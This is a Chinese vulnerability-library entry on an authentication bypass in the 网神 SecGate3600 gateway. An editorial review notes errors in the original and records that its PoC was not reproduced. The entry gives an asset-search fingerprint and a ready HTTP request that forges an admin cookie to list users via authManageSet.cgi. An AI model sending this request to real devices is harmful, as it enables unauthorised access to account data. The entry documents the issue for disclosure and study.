---
source: "wy876 漏洞文库"
id: "vw-c8077fb0ac99d4ea07638205"
entity_id: "ve-c8077fb0ac99d4ea07638205"
schema_version: "1"
fofa_unverified: "web.body="
title: "网神 SecGate3600 authManageSet.cgi 用户查询鉴权线索"
product: "网神SecGate3600-A1500"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "伪造admin Cookie；固件版本未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/360/%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3authManageSet.cgi%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lz3gvfl7e9gp74wi"
source_status: "recorded"
---

# 网神 SecGate3600 authManageSet.cgi 用户查询鉴权线索

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：网神SecGate3600-A1500
- 本文讨论：authManageSet.cgi getAllUsers信任sw_login_name
- 版本、权限与配置前提：伪造admin Cookie；固件版本未给
- 资料类型：认证绕过/信息查询请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- SecGata为SecGate拼写错误，360目录不准确产品归属
- 标题登录绕过而请求是用户信息查询，无登录会话或密码响应证据
- 影响版本节误叫漏洞简介，FOFA元数据误装残缺Hunter语法
- 已落实的文本修订：“SecGata”改为“SecGate”；HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值；标题与正文证据对齐。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- Cookie校验、敏感返回字段及型号/固件待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
SecGate3600是网神信息技术(北京)股份有限公司旗下一款安全网关产品，网神 SecGate3600 存在登录绕过漏洞，攻击者利用该漏洞可获取管理员密码等敏感信息，进一步控制系统。

# 二、漏洞简介
+ 网神SecGate 3600-A1500

# 三、资产测绘
+ hunter`web.body="sec_gate_image/login_02.gif"`
+ 特征


# 四、漏洞复现
```http
POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
Host: {hostname}
Content-Type: application/x-www-form-urlencoded
Cookie: sw_login_name=admin
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lz3gvfl7e9gp74wi>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
